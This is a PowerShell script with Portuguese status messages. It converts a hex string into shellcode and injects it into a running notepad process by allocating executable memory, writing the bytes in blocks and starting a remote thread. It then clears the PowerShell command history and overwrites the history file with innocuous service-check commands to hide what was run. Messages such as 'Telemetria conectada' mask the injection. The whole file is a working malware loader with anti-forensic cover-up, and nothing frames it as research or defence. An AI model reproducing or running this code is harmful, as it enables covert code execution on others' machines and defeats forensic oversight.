$hexData = $hexString -split ' '

$shellcode = foreach ($byte in $hexData) {
    [byte]::Parse($byte, 'HexNumber')
}

if ($shellcode.Length -eq 0) {
    Write-Error "Falha ao criar injeo"
    return
}

Write-Output "Injeo carregada com sucesso. Tamanho: $($shellcode.Length) bytes."

$process = Get-Process -Name "notepad" -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $process) {
    Write-Error "Processo no encontrado."
    return
}

$processId = $process.Id
Write-Output "Telemetria conectada. PID: $processId"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$BLOCK_SIZE = 4096

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, [int]$processId)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Falha ao abrir o processo."
    return
}

Write-Output "Processo manipulado."

$totalSize = [uint32]$shellcode.Length
$addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $totalSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

if ($addr -eq [IntPtr]::Zero) {
    $lastError = [Win32]::GetLastError()
    Write-Error "Falha ao alocar memria. Cdigo de erro: $lastError"
    return
}

Write-Output "Memria alocada no processo. Endereo: $addr"

$offset = [uint32]0
while ($offset -lt $totalSize) {
    $blockSize = [Math]::Min($BLOCK_SIZE, $totalSize - $offset)
    $block = $shellcode[$offset..($offset + $blockSize - 1)]

    [int]$bytesWritten = 0
    $addrOffset = [IntPtr]($addr.ToInt64() + $offset)
    $writeSuccess = [Win32]::WriteProcessMemory($hProcess, $addrOffset, $block, [uint32]$block.Length, [ref]$bytesWritten)

    if (-not $writeSuccess -or $bytesWritten -ne $block.Length) {
        $lastError = [Win32]::GetLastError()
        Write-Error "Falha ao escrever bloco na memria. Cdigo de erro: $lastError"
        return
    }

    $offset += $blockSize
    Write-Output "Bloco escrito na memria. Offset: $offset, Tamanho do bloco: $blockSize bytes."
}

Write-Output "Shellcode completo escrito na memria."

[uint32]$threadId = 0
$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)

if ($hThread -eq [IntPtr]::Zero) {
    $lastError = [Win32]::GetLastError()
    Write-Error "Falha ao criar thread remota. Cdigo de erro: $lastError"
    return
}

Write-Output "Thread remota criada com sucesso. ID: $threadId"

Start-Sleep -Seconds 3
Write-Output "Processo finalizado."

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

$null = [Microsoft.PowerShell.PSConsoleReadLine]::GetHistoryItems()

$historyFile = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

$newCommand = 'get-service | findstr -i "pcasvc"; get-service | findstr -i "DPS"; get-service | findstr -i "Diagtrack"; get-service | findstr -i "sysmain"; get-service | findstr -i "eventlog"'

if (Test-Path $historyFile) {
    Set-Content -Path $historyFile -Value $newCommand -Force
    Write-Host "Histrico resetado"
} else {
    Write-Host "Arquivo de histrico no encontrado."
}
